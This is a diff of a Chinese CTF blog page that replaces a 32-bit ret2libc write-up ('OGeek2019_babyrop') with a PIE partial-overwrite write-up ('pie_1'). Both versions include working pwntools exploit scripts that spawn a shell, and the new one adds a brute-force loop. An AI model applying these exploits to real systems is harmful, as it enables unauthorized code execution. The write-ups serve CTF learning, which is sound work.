@@ -11,7 +11,7 @@
         name="viewport"
         content="width=device-width, initial-scale=1, maximum-scale=1"
       />
-      <title>OGeek2019_babyrop |  屿</title>
+      <title>pie_1 |  屿</title>
   <meta name="generator" content="hexo-theme-ayer">
       
       <link rel="shortcut icon" href="/favicon.ico" />
@@ -66,7 +66,7 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="post-OGeek2019 babyrop"
+  id="post-pie_1"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -77,7 +77,7 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  OGeek2019_babyrop
+  pie_1
 </h1>
  
 
@@ -85,11 +85,11 @@
     </header>
      
     <div class="article-meta">
-      <a href="/2021/10/10/OGeek2019%20babyrop/" class="article-date">
-  <time datetime="2021-10-10T01:00:00.000Z" itemprop="datePublished">2021-10-10</time>
+      <a href="/2021/10/25/pie_1/" class="article-date">
+  <time datetime="2021-10-25T01:00:00.000Z" itemprop="datePublished">2021-10-25</time>
 </a> 
   <div class="article-category">
-    <a class="article-category-link" href="/categories/buu/">buu</a> / <a class="article-category-link" href="/categories/buu/pwn/">pwn</a>
+    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a> / <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/pwn/">pwn</a>
   </div>
   
 <div class="word_count">
@@ -97,7 +97,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> Word count:</span>
-            <span class="post-count">358</span>
+            <span class="post-count">798</span>
         </span>
     </span>
 
@@ -106,40 +106,69 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> Reading time≈</span>
-            <span class="post-count">1 min</span>
+            <span class="post-count">3 min</span>
         </span>
     </span>
 </div>
  
     </div>
       
+    <div class="tocbot"></div>
+
 
 
 
   
     <div class="article-entry" itemprop="articleBody">
        
-  <p>checksec </p>
-<p><img src="/2021/10/10/OGeek2019%20babyrop/image-20211021235625510.png"></p>
+  <p>1</p>
+<h1 id="sonic"><a href="#sonic" class="headerlink" title="sonic"></a>sonic</h1><p>checksec</p>
+<p><img src="/2021/10/25/pie_1/image-20211026205558339.png"></p>
+<p><img src="/2021/10/25/pie_1/image-20211026205630744.png"></p>
+<p>跑一下程序可以看到给了main函数的地址，这边由于开启了pie保护（<strong>position-independent executable</strong>），简单理解就是程序中的基地址随机化了但其偏移地址后三位不会变。</p>
 <p>ida</p>
-<p><img src="/2021/10/10/OGeek2019%20babyrop/image-20211022001224677.png"></p>
-<p>sub函数看看</p>
-<p><img src="/2021/10/10/OGeek2019%20babyrop/image-20211022002155033.png"></p>
-<p>v5读入一个buf，而v1为buf的长度，然后一个strncmp函数</p>
-<p><img src="/2021/10/10/OGeek2019%20babyrop/image-20211022002313426.png"></p>
-<p>它是逐个字节进行比较的，而这里我们要让他直接停止比较，使得v1等于0 ，故往buf中写入\0。</p>
-<p>接下来是这个</p>
-<p><img src="/2021/10/10/OGeek2019%20babyrop/image-20211022002756780.png"></p>
-<p>这边传进来的参数，是前面buf中最后一个字节的int值。而这里要从e7开始溢出，故只能用else中的read函数，所以buf中最后一个字节要尽可能的大。</p>
-<p>exp：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#32位程序，先用\0终止strlen函数，之后用Ret2libc得到sys与binsh地址</span></span><br><span class="line"><span class="comment">#用write_plt泄露write的地址</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29773</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn9&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc-2.23.so&#x27;)</span></span><br><span class="line">e = ELF(<span class="string">&quot;./pwn9&quot;</span>)</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt_addr = e.plt[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">write_got_addr = e.got[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">sub_080487D0 = <span class="number">0x080487D0</span></span><br><span class="line">payload1 = <span class="string">b&#x27;\0&#x27;</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">6</span> + p32(<span class="number">0xff</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload1)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0xE7</span> + <span class="number">4</span></span><br><span class="line">payload2 = offset*<span class="string">b&#x27;a&#x27;</span> + p32(write_plt_addr) + p32(sub_080487D0) + p32(<span class="number">1</span>) + p32(write_got_addr) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Correct\n&quot;</span>)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line">write_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr)) </span><br><span class="line">libcbase = write_addr -<span class="number">0x0d43c0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libcbase:&#x27;</span>+<span class="built_in">hex</span>(libcbase))</span><br><span class="line">sys_addr = libcbase +<span class="number">0x03a940</span></span><br><span class="line">bin_sh = libcbase + <span class="number">0x15902b</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#libc = LibcSearcher(&#x27;write&#x27;,write_addr)</span></span><br><span class="line"><span class="comment">#libcbase= write_addr -libc.dump(&#x27;write&#x27;)</span></span><br><span class="line"><span class="comment">#sys_addr = libcbase + libc.dump(&#x27;system&#x27;)</span></span><br><span class="line"><span class="comment">#bin_sh = libcbase + libc.dump(&#x27;str_bin_sh&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload3 = offset * <span class="string">b&#x27;A&#x27;</span> + p32(sys_addr)+ p32(<span class="number">0</span>)  + p32(bin_sh)</span><br><span class="line"></span><br><span class="line">io.sendline(payload3)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="/2021/10/25/pie_1/image-20211026205700970.png"></p>
+<p><img src="/2021/10/25/pie_1/image-20211026205742322.png"></p>
+<p>可见src可以溢出，但程序开启了pie保护，不能直接溢出，再联系前面程序给的main函数地址，那么就可以覆盖其低三位来溢出覆盖返回地址。</p>
+<p>这边有个nologin</p>
+<p><img src="/2021/10/25/pie_1/image-20211026210854482.png"></p>
+<p>它的地址为：0x73a</p>
+<p>main函数地址为：0x7cf</p>
+<p>二者相差0x7cf-0x73a=0x95</p>
+<p>所以在接收到main函数地址的前提下，payload应该长这样</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>+p64(main-<span class="number">0x95</span>)</span><br></pre></td></tr></table></figure>
 
-<p>这边用远程libcsearcher找不到合适的动态链接库，所以只好手动打了。</p>
-<p>总结：</p>
-<ul>
-<li>32位ret2libc</li>
-<li>注意绕过题目中一些限制条件，这边用的绕过strlen。</li>
-</ul>
+<p>这个时候gdb看了一下，哎确实！返回地址ret被覆盖成了noAuthLogin的地址了，如下图</p>
+<p><img src="/2021/10/25/pie_1/image-20211026212846830.png"></p>
+<p>然而，但是，可是我一开始并没有用这个办法（QWQ舍近求远了），我想着这开了pie保护，那就直接开干覆盖后三位就行，而由于两个16进制位为一个字节，那么一次最少得覆盖两个字节才行，这意味着要爆破剩下半个字节，没事16个数字而已很快的，开动。</p>
+<p>然而并不顺利</p>
+<p><img src="/2021/10/25/pie_1/image-20211026215009906.png"></p>
+<p>这个是爆破想法的payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>+<span class="string">b&#x27;\x3a&#x27;</span>+<span class="string">b&#x27;\x07&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>在我对src爆破后却一直失败，于是便打开gdb步步跟进看看。</p>
+<p><img src="/2021/10/25/pie_1/image-20211026220310230.png"></p>
+<p>可以看到，到这一步是进行get</p>
+<p><img src="/2021/10/25/pie_1/image-20211026220655011.png"></p>
+<p>看下栈中内容，如上图，可以看到返回地址已经被改成了0xe0073a了</p>
+<p><img src="/2021/10/25/pie_1/image-20211026220917475.png"></p>
+<p>然而到最后直到makeUserName中的strcpy函数执行完跳转到返回地址时这之间却发生了变化，变成了0x00073e有一个字节被改为了00，就很奇怪。</p>
+<p><img src="/2021/10/25/pie_1/image-20211026222127351.png"></p>
+<p>有时候程序基地址刚好是00，那么又会碰对，这恰好。。。</p>
+<p><img src="/2021/10/25/pie_1/image-20211026222447613.png"></p>
+<p>最后一条一条指令调试，连蒙带猜，发现了问题所在，如下</p>
+<p><img src="/2021/10/25/pie_1/image-20211026235301476.png"></p>
+<p>执行上面的指令byte ptr [rdx],0（gets+196）执行之前，栈中的数据是0x20073a，</p>
+<p><img src="/2021/10/25/pie_1/image-20211026235512742.png"></p>
+<p><img src="/2021/10/25/pie_1/image-20211027001543716.png"></p>
+<p><img src="/2021/10/25/pie_1/image-20211027001619607.png"></p>
+<p>执行完后rdx寄存器的最低位被一个单字节的0给替换了，就由0x5574a620073a变为了0x5574a600073a。</p>
+<p>exp如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./sonic&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;123.60.63.90&#x27;,6889)</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Address=0x&#x27;</span>)</span><br><span class="line">main = <span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="string">&#x27;main:&#x27;</span>+<span class="built_in">hex</span>(main))		<span class="comment">#0x7cf-0x73a=0x95</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>+p64(main-<span class="number">0x95</span>)	</span><br><span class="line"><span class="comment">#payload = b&#x27;a&#x27;*0x20+b&#x27;b&#x27;*8+b&#x27;\x3a&#x27;+b&#x27;\x07&#x27;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>贴上一个没啥用的爆破exp………………..QWQ</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def pwn()</span></span><br><span class="line"><span class="string">	#z(&#x27;b *$rebase(0x7cf)&#x27;)</span></span><br><span class="line"><span class="string">        io.recvuntil(&quot;=0x&quot;)</span></span><br><span class="line"><span class="string">        main = int(io.recv(12),16)	//爆破就不需要这个，直接干</span></span><br><span class="line"><span class="string">        print(&quot;success：&quot;+hex(main))</span></span><br><span class="line"><span class="string">        payload = b&#x27;a&#x27;*0x20+b&#x27;b&#x27;*8+b&#x27;\x3a&#x27;+b&#x27;\x07&#x27;</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">    </span><br><span class="line">        <span class="comment">#io=remote(&#x27;123.60.63.90&#x27;,6889)</span></span><br><span class="line">        io=process(<span class="string">&#x27;./sonic&#x27;</span>)</span><br><span class="line">        <span class="comment">#sleep(1)</span></span><br><span class="line">        context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">        gdb.attach(io,<span class="string">&#x27;b *$rebase(0x7cf)&#x27;</span>)</span><br><span class="line">        io.recvuntil(<span class="string">&quot;=0x&quot;</span>)</span><br><span class="line">        main = <span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;success：&quot;</span>+<span class="built_in">hex</span>(main))</span><br><span class="line">        payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>+<span class="string">b&#x27;\x3a&#x27;</span>+<span class="string">b&#x27;\x07&#x27;</span></span><br><span class="line">        io.sendline(payload)</span><br><span class="line">        result=io.recvline()</span><br><span class="line">        <span class="keyword">if</span>(result != <span class="string">&#x27;&#x27;</span>):</span><br><span class="line">            io.interactive()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        io.close()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;retrying...&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
  
       <!-- reward -->
       
@@ -210,12 +239,12 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://iy30.github.io/2021/10/10/OGeek2019%20babyrop/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://iy30.github.io/2021/10/25/pie_1/" alt="微信分享二维码">
     </div>
 </div>
 
 <div id="share-mask"></div>  
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/32%E4%BD%8Dret2libc/" rel="tag">32位ret2libc</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%94%A8write%E6%B3%84%E9%9C%B2%E5%9C%B0%E5%9D%80/" rel="tag">用write泄露地址</a></li></ul>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pie/" rel="tag">pie</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ret2text/" rel="tag">ret2text</a></li></ul>
 
     </footer>
   </div>
@@ -223,19 +252,19 @@
    
   <nav class="article-nav">
     
-      <a href="/2021/10/10/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%20%E5%86%B3%E8%B5%9B%20PWN5/" class="article-nav-link">
+      <a href="/2021/10/25/babyheap_0ctf_2017/" class="article-nav-link">
         <strong class="article-nav-caption">上一篇</strong>
         <div class="article-nav-title">
           
-            第五空间2019_决赛PWN5
+            babyheap_0ctf_2017
           
         </div>
       </a>
     
     
-      <a href="/2021/09/24/heap/" class="article-nav-link">
+      <a href="/2021/10/17/jarvisoj_level2/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">heap</div>
+        <div class="article-nav-title">jarvisoj_level2</div>
       </a>
     
   </nav>
